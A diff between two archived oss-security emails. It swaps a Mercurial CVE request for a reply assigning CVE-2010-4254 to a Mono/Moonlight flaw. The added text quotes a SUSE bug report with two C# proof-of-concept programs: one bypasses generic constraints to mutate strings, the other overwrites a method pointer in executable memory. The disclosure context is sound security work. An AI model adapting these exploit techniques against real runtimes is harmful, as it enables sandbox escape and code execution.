@@ -1,21 +1,14 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2010/10/11/7
-Message-ID: <890354492.159911286826519275.JavaMail.root@zmail01.collab.prod.int.phx2.redhat.com>
-Date: Mon, 11 Oct 2010 15:48:39 -0400 (EDT)
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2010/11/29/3
+Message-ID: <1544809689.736861291062980367.JavaMail.root@zmail01.collab.prod.int.phx2.redhat.com>
+Date: Mon, 29 Nov 2010 15:36:20 -0500 (EST)
 From: Josh Bressers <bressers@...hat.com>
 To: oss-security@...ts.openwall.com
-Cc: Bill Janssen <bill.janssen@...il.com>, Andreas Hasenack <ahasenack@...ra.com.br>, Mads Kiilerich <mads@...lerich.com>, "Steven M. Christey" <coley@...us.mitre.org>
-Subject: Re: CVE Request -- Mercurial --Doesn't verify subject Common Name properly
+Cc: coley <coley@...re.org>
+Subject: Re: CVE request: mono/moonlight: execution of arbitrary code due to mutable Strings
 Content-Type: text/plain; charset=utf-8
 
-Steve,
-
-Can I defer this one to MITRE? My initial thought is that python should get
-the ID, but they seem to want to push it up to the application developers,
-but they also added some functionality in
-http://svn.python.org/view?view=rev&revision=85321
-
-Is there a past precedent for this?
+Please use CVE-2010-4254 for this.
 
 Thanks.
 
@@ -23,43 +16,147 @@ Thanks.
     JB
 
 
------ "Jan Lieskovsky" <jlieskov@...hat.com> wrote:
+----- "Thomas Biege" <thomas@...e.de> wrote:
 
-> Hello Steve, vendors,
+> Hello.
 > 
->    a security flaw was found in the way Mercurial handled subject
-> Common Name field of the provided certificate (the check
-> if the commonName in the received certificate matches the
-> requested hostname was not performed). An attacker, able
-> to get a carefully-crafted certificate signed by a Certificate
-> Authority could use the certificate during a man-in-the-middle
-> attack and potentially confuse Mercurial into accepting it by
-> mistake.
+> Just a copy-n-paste from our bugzilla (again):
 > 
-> References:
-> [1] http://mercurial.selenic.com/bts/issue2407
-> [2] https://bugzilla.redhat.com/show_bug.cgi?id=641373
-> [3] http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=598841
-> Upstream patch:
-> [4]
-> http://selenic.com/repo/hg-stable/diff/f2937d6492c5/mercurial/url.py
+> ------------------------------------------------------------------------------
+> SP 2010-11-24 20:45:21 UTC
 > 
-> According to [1] the true reason for this problem is the new python
-> SSL
-> module implementation:
-> [5] http://bugs.python.org/issue1589
-> [6] http://svn.python.org/view?view=rev&revision=85321
+> Original (pulled by author) blog entry:
 > 
-> and as stated in:
-> [7] http://bugs.python.org/issue1589#msg58472
+> So I was messing around with generic methods and discovered that
+> generic
+> constraints can be bypassed on Mono 2.6.7 and 2.8 using reflection
+> (with the
+> exception of the new() constraint). One of the fun results of this bug
+> is that
+> the String class can be made mutable without using reflection to set
+> private
+> members!
 > 
-> it should be decision made by application designers, if the subject
-> CN
-> field will be checked despite of the python SSL module
-> implementation.
+> The following code demonstrates this; it is legal and will run on Mono
+> up to
+> and including version 2.8:
 > 
-> So could you allocate a CVE identifier for this issue(s)?
+> using System;
+> using System.Reflection;
 > 
-> Thanks && Regards, Jan.
+> public class FakeString {
+>     public int length;
+>     public char start_char;
+> }
+> 
+> public class TestCase {
+>     private static FakeString UnsafeConversion<T>(T thing)
+>         where T : FakeString
+>     {
+>         return thing;
+>     }
+> 
+>     public static void Main() {
+>         var a = "foo";
+>         var b = MakeMutable(a);
+> 
+>         Console.WriteLine(a);
+>         b.start_char = 'b';
+>         Console.WriteLine(a);
+>     }
+> 
+>     private static FakeString MakeMutable(string s)
+>     {
+>         var m = typeof(TestCase).GetMethod("UnsafeConversion",
+> BindingFlags.NonPublic | BindingFlags.Static);
+>         var m2 = m.MakeGenericMethod(typeof(string));
+> 
+>         var d = (Func<string,
+> FakeString>)Delegate.CreateDelegate(typeof(Func<string, FakeString>),
+> null,
+> m2);
+> 
+>         return d(s);
+>     }
+> }
+> 
+> 
+> 
+> Comment 1 SP 2010-11-24 20:54:20 UTC
+> 
+> This is a follow up of the previous
+> https://bugzilla.novell.com/show_bug.cgi?id=654136
+> 
+> The original blog entry allow trusted (by moonlight) code to mutate
+> strings
+> which could be used to trick policies (e.g. give a valid URL and, once
+> 
+> accepted
+> as a valid xdomain URL, change it to something else).
+> 
+> It can also be extended to arbitrary code execution. POC by Geoff
+> Norton: 
+> 
+> using System;
+> using System.Reflection;
+> using System.Runtime.InteropServices;
+> 
+> public class DelegateWrapper {
+>     public IntPtr method_ptr;
+> }
+> 
+> public delegate void MethodWrapper ();
+> 
+> public class BreakSandbox {
+>     private static DelegateWrapper Convert <T> (T dingus) where T :
+> DelegateWrapper {
+>         return dingus;
+>     }
+> 
+>     private static DelegateWrapper ConvertDelegate (Delegate del) {
+>         var m = typeof (BreakSandbox).GetMethod ("Convert",
+> BindingFlags.NonPublic | BindingFlags.Static);
+>         var gm = m.MakeGenericMethod (typeof (Delegate));
+> 
+>         var d = (Func <Delegate, DelegateWrapper>)
+> Delegate.CreateDelegate
+> (typeof (Func <Delegate, DelegateWrapper>), null, gm);
+> 
+>         return d (del);
+>     }
+> 
+>     public static void Main (string [] args) {
+>         MethodWrapper d = delegate {
+>             Console.WriteLine ("Hello");
+>         };
+> 
+>         d ();
+>         var converted = ConvertDelegate (d);
+>         // Overwrite the already WX page with a 'ret'
+>         Marshal.WriteByte (converted.method_ptr, (byte) 0xc3);
+>         d ();
+>     }
+> }
+> 
+> This code won't execute on Moonlight (since all Marshal.* code is
+> SecurityCritical) but it would not be hard to modify the POC to do the
+> same
+> without SecurityCritical code.
+> 
+> Note: the bug is present in Mono but does not represent a security
+> vulnerability there since Mono (unlike Moonlight) can only execute
+> trusted
+> code.
+> 
+> [reply] [-]
+> Private
+> Comment 2 
+> ------------------------------------------------------------------------------
+> 
+> -- 
+>  Thomas Biege <thomas@...e.de>, SUSE LINUX, Security Support &
+> Auditing
+>  SUSE LINUX Products GmbH, GF: Markus Rex, HRB 16746 (AG Nuernberg)
 > --
-> Jan iankko Lieskovsky / Red Hat Security Response Team
+>   Wer aufhoert besser werden zu wollen, hoert auf gut zu sein.
+>                             -- Marie von Ebner-Eschenbach
